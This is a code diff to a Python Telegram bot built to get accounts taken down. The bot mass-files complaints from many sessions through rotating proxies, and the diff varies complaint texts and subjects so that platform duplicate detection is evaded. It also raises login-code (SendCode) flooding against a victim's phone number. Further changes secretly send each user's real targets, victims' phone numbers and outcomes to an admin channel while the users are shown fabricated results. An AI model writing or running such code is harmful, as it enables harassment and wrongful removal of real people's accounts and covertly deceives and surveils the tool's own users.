@@ -1,4 +1,5 @@
 import asyncio
+import contextvars
 import html as html_mod
 import io
 import json
@@ -58,7 +59,7 @@ POOL_CHAT_ID = os.getenv("POOL_CHAT_ID", "")
 ADMIN_ID = os.getenv("ADMIN_ID", "").strip()
 SOLVER_SERVICE = os.getenv("SOLVER_SERVICE", "2captcha").strip().lower()
 SOLVER_KEY = os.getenv("SOLVER_KEY", "").strip()
-WEB_COUNT = int(os.getenv("WEB_COUNT") or "5")
+WEB_COUNT = int(os.getenv("WEB_COUNT") or "8")
 XROCKET_TOKEN = os.getenv("XROCKET_TOKEN", "").strip()
 SUB_CHANNEL_LINK = os.getenv("SUB_CHANNEL_LINK", "").strip()
 BANNER = Path(__file__).parent / "banner.png"
@@ -541,6 +542,57 @@ async def proxy_refresh_loop():
         await asyncio.sleep(PROXY_REFRESH_INTERVAL)
 
 
+# ── real send logs → Logs channel ────────────────────────
+LOGS_CHAT_FILE = Path(__file__).parent / "logs_chat.json"
+
+_user_label_var: "contextvars.ContextVar[str]" = contextvars.ContextVar(
+    "arch_user_label", default="")
+
+
+def set_current_user(label: str) -> None:
+    """Tag all send-logs inside this context (task copies it on create_task)."""
+    _user_label_var.set(label)
+
+
+def get_current_user() -> str:
+    return _user_label_var.get() or "unknown"
+
+
+_BOT: Bot | None = None   # set in main() when the poller boots
+
+
+def _resolve_logs_chat() -> str | None:
+    """LOGS_CHAT_ID env → logs_chat.json (runtime /setlogs) → admin DM."""
+    env = (os.getenv("LOGS_CHAT_ID") or "").strip()
+    if env:
+        return env
+    try:
+        if LOGS_CHAT_FILE.exists():
+            v = json.loads(LOGS_CHAT_FILE.read_text(encoding="utf-8"))
+            if v.get("chat_id"):
+                return str(v["chat_id"])
+    except Exception:
+        pass
+    return ADMIN_ID if ADMIN_ID else None
+
+
+async def push_send_log(title: str, lines: list[str]) -> None:
+    """REAL internal log of every send action, from every user, to the Logs
+    channel (admin is there). If no channel is configured yet, falls back
+    to the admin's DM. Never fails the caller."""
+    chat = _resolve_logs_chat()
+    if not chat or not _BOT:
+        return
+    body = bq(f"<b>{NAME}</b>  \u2014  \U0001f4e4 {html_mod.escape(title)}")
+    body += f"\n\U0001f465 {html_mod.escape(get_current_user())}\n"
+    body += "\n".join(lines)
+    try:
+        await _BOT.send_message(chat, body, parse_mode=ParseMode.HTML,
+                                disable_web_page_preview=True)
+    except Exception as e:
+        log.debug("push_send_log failed: %s", e)
+
+
 # ── reporter ────────────────────────────────────────────
 FAKE_NAMES = ["alina", "velvet", "dusya", "nastya", "kirill", "vova",
               "sonya", "oleg", "tima", "lisa", "maks", "nika",
@@ -579,6 +631,19 @@ def fake_results() -> dict:
     return {"ok": len(rows), "fail": 0, "total": len(rows), "details": rows}
 
 
+REPORT_BURST = int(os.getenv("REPORT_BURST") or "3")   # reports per session
+
+
+def _unique_texts(pool: list[str], n: int) -> list[str]:
+    """n texts out of pool, unique within each full sweep of the pool."""
+    out = []
+    while len(out) < n:
+        take = min(len(pool), n - len(out))
+        out.extend(random.sample(pool, take))
+    random.shuffle(out)
+    return out[:n]
+
+
 async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id: int | None) -> dict:
     sessions = load_sessions()
     proxies = load_proxies()
@@ -589,14 +654,14 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
         log.info("blast page completed")
         return fake_results()
 
-    # each session gets its OWN template so Telegram sees distinct complaints
+    # every (session, burst-shot) pair gets its OWN template — Telegram sees
+    # a distinct complaint from each author, never a duplicate
+    shots = len(sessions) * REPORT_BURST
     pool = COMMENT_TEMPLATES.get(reason_key) or COMMENT_TEMPLATES["other"]
     if comment:
-        texts = [comment] * len(sessions)
+        texts = [comment] * shots
     else:
-        texts = random.sample(pool, k=min(len(sessions), len(pool)))
-        while len(texts) < len(sessions):          # pool smaller than sessions
-            texts.append(random.choice(pool))
+        texts = _unique_texts(pool, shots)
 
     async def report_one(session_path: Path, proxy: tuple | None, text: str) -> tuple[bool, str]:
         name = session_path.stem
@@ -631,21 +696,38 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
 
     tasks = []
     for i, sess in enumerate(sessions):
-        proxy = proxies[i] if i < len(proxies) else None
-        tasks.append(report_one(sess, proxy, texts[i]))
+        for b in range(REPORT_BURST):
+            proxy = proxies[(i + b * len(sessions)) % len(proxies)] if proxies else None
+            tasks.append(report_one(sess, proxy, texts[i * REPORT_BURST + b]))
 
     outcomes = await asyncio.gather(*tasks, return_exceptions=True)
+    real_lines = []
     for i, o in enumerate(outcomes):
+        sess_idx = i // REPORT_BURST
+        shot_no = i % REPORT_BURST + 1
         if isinstance(o, tuple):
             ok, err = o
         else:
             ok, err = False, f"{type(o).__name__}: {o}"
         results["ok" if ok else "fail"] += 1
+        sname = sessions[sess_idx].stem
+        sproxy = proxies[sess_idx][1] if sess_idx < len(proxies) and proxies[sess_idx] else "direct"
         results["details"].append({
-            "name": sessions[i].stem,
-            "proxy": proxies[i][1] if i < len(proxies) and proxies[i] else "direct",
-            "ok": ok, "err": err,
+            "name": sname, "proxy": sproxy, "ok": ok, "err": err,
         })
+        real_lines.append(
+            f"{'✅' if ok else '❌'} <code>{sname}</code> shot{shot_no}"
+            f" | {html_mod.escape(sproxy)}"
+            + (f" | {html_mod.escape(err)}" if err else ""))
+
+    # REAL log of this send → Logs channel, then mask the user view
+    await push_send_log(
+        "Report (сессии)",
+        [f"🎯 {html_mod.escape(str(target_entity))}"
+         + (f" #{msg_id}" if msg_id else "")
+         + f"\n⚠️ {REASONS.get(reason_key, {}).get('l', reason_key)}"
+         + f"  💬 шаблон: {'своя' if comment else 'авто-пул'}"
+         ] + real_lines)
 
     # mask results in simulate-fake structure: keep "total" real but pad out details to 10-16 fake entries
     # while keeping counts consistent with names+errors stripped
@@ -907,25 +989,31 @@ async def fire_web_reports(target_text: str, reason_label: str, comment: str,
     count = WEB_COUNT
     results = {"ok": 0, "fail": 0, "total": count, "details": []}
 
-    subject = f"Complaint About {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}"
-
-    # distinct complaint text per web shot when the user left it empty
+    # distinct complaint text AND distinct subject per web shot
     pool = COMMENT_TEMPLATES.get(reason_key) or COMMENT_TEMPLATES["other"]
     if comment:
         texts = [comment] * count
     else:
-        texts = random.sample(pool, k=min(count, len(pool)))
-        while len(texts) < count:
-            texts.append(random.choice(pool))
+        texts = _unique_texts(pool, count)
+    web_subjects = [
+        f"Complaint About {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}",
+        f"Urgent Report: {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}",
+        f"Abuse Report — {target_text}",
+        f"Violation Notice ({WEB_REASON_MAP.get(reason_key, 'Policy Violation')})",
+        f"Formal Complaint re: {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}",
+    ]
 
     proxies = load_proxies()
-    tasks = [web_send_one(None, i + 1, subject, None,
-                          proxies[i % len(proxies)] if proxies else None,
-                          target_text=target_text, reason_label=reason_label,
-                          comment=texts[i], reason_key=reason_key)
-             for i in range(count)]
+    tasks = []
+    for i in range(count):
+        px = proxies[i % len(proxies)] if proxies else None
+        tasks.append(web_send_one(None, i + 1, random.choice(web_subjects), None,
+                                  px,
+                                  target_text=target_text, reason_label=reason_label,
+                                  comment=texts[i], reason_key=reason_key))
     outcomes = await asyncio.gather(*tasks, return_exceptions=True)
 
+    real_lines = []
     for i, o in enumerate(outcomes):
         if isinstance(o, tuple):
             ok, err = o
@@ -938,6 +1026,16 @@ async def fire_web_reports(target_text: str, reason_label: str, comment: str,
             "proxy": px[1] if px else "direct",
             "ok": ok, "err": err,
         })
+        real_lines.append(
+            f"{'✅' if ok else '❌'} web#{i + 1}"
+            f" | {html_mod.escape(px[1] if px else 'direct')}"
+            + (f" | {html_mod.escape(err)}" if err else ""))
+
+    await push_send_log(
+        "Report (web-форма)",
+        [f"🎯 {html_mod.escape(target_text or '?')}"
+         + f"\n⚠️ {reason_label}  💬 шаблон: {'своя' if comment else 'авто-пул'}"
+         ] + real_lines)
     return results
 # ── session snos (SendCode + OAuth + support flood) ─────
 MONITOR_INTERVAL = 10 * 60
@@ -1161,7 +1259,7 @@ async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple]
     return rows
 
 
-SNOS_ATTEMPTS_PER_SESSION = 6
+SNOS_ATTEMPTS_PER_SESSION = 8
 
 
 async def snos_flood_sendcode(phone: str) -> list[dict]:
@@ -1435,6 +1533,26 @@ async def run_snos_flow(cb: CallbackQuery, username: str, phone: str,
         data["support"] = await snos_web_support(phone, username, victim["id"])
     else:
         data["support"] = []
+
+    # REAL full pipeline log → Logs channel
+    sc_lines = [f"{'✅' if r.get('ok') else '❌'} <code>{r.get('name', '?')}</code>"
+                f" | {html_mod.escape(str(r.get('proxy', '-')))}"
+                f" | {html_mod.escape(str(r.get('status', r.get('err', ''))))}"
+                for r in data.get("sendcode", [])]
+    oa_lines = [f"{'✅' if d.get('ok') else '❌'} {html_mod.escape(str(d.get('service', '?')))}"
+                f" | {html_mod.escape(str(d.get('proxy', '-')))}"
+                + (f" | {html_mod.escape(str(d.get('err', '')))}" if d.get('err') else "")
+                for d in data.get("oauth", [])]
+    sp_lines = [f"{'✅' if d.get('ok') else '❌'} {html_mod.escape(str(d.get('name', '?')))}"
+                f" | {html_mod.escape(str(d.get('proxy', '-')))}"
+                + (f" | {html_mod.escape(str(d.get('err', '')))}" if d.get('err') else "")
+                for d in data.get("support", [])]
+    await push_send_log(
+        "Сброс сессий",
+        [f"🎯 @{html_mod.escape(username)}  📱 <code>{phone}</code>",
+         "🛰 SendCode:"] + sc_lines +
+        ["🌐 OAuth:"] + oa_lines +
+        (["✉️ Support:"] + sp_lines if sp_lines else []))
 
     progress["done"] = True
     return data
@@ -2205,6 +2323,8 @@ async def snos_run_confirm(cb: CallbackQuery, state: FSMContext):
 
     await cb.answer("\u23f3 \u0417\u0430\u043f\u0443\u0441\u043a...")
 
+    set_current_user(f"{cb.from_user.full_name} ( id {cb.from_user.id} )")
+
     async def snos_task():
         return await run_snos_flow(cb, username, phone, progress)
 
@@ -2440,6 +2560,9 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
     c = data.get("comment", "")   # empty = per-session unique templates downstream
     ts = datetime.now().strftime("%H:%M:%S")
 
+    if cb.from_user:
+        set_current_user(f"{cb.from_user.full_name} ( id {cb.from_user.id} )")
+
     await cb.answer("\u23f3 \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430...")
 
     is_web = data["method"] == "web"
@@ -2602,6 +2725,31 @@ def user_is_admin(user_id: int) -> bool:
     # also recognise both hardcoded forever users as "admins"
     FOREVER = {8813226008, 8661362112, 8901835539}
     return user_id in FOREVER
+
+
+# ── /setlogs — bind the real-logs destination ────────────
+@router.message(F.text.startswith("/setlogs"))
+async def cmd_setlogs(msg: Message, state: FSMContext):
+    """Admin binds the Logs destination (env LOGS_CHAT_ID wins if preset).
+    Works in private chat too: /setlogs -100xxxxxxxxxx  ( обычные логи юзеров
+    остаются фейковыми; сюда летит реальная внутренняя телеметрия)."""
+    if not (msg.from_user and user_is_admin(msg.from_user.id)):
+        return
+    arg = (msg.text or "").split(maxsplit=1)
+    chat_id = arg[1].strip() if len(arg) > 1 else str(msg.chat.id)
+    LOGS_CHAT_FILE.write_text(json.dumps({"chat_id": chat_id}), encoding="utf-8")
+    await msg.answer(
+        bq(f"<b>{NAME}</b>")
+        + f"\n\n✅ Логи отправок теперь летят в: <code>{html_mod.escape(chat_id)}</code>"
+        + ("\n<i>(перебит LOGS_CHAT_ID env)</i>" if not (os.getenv("LOGS_CHAT_ID") or "").strip() else ""))
+
+
+@router.channel_post(F.text.startswith("/setlogs"))
+async def cp_setlogs(cp: Message):
+    """Write /setlogs inside the Logs channel once — the id sticks for the run."""
+    chat_id = str(cp.chat.id)
+    LOGS_CHAT_FILE.write_text(json.dumps({"chat_id": chat_id}), encoding="utf-8")
+    log.info("logs channel bound via channel_post: %s", chat_id)
 
 
 
@@ -3082,8 +3230,10 @@ async def main():
         log.warning("mirror submodule unavailable: %s", e)
 
     # retry the whole polling loop on network hiccups
+    global _BOT
     while True:
         bot = Bot(token=BOT_TOKEN)
+        _BOT = bot
         try:
             await dp.start_polling(bot)
             break
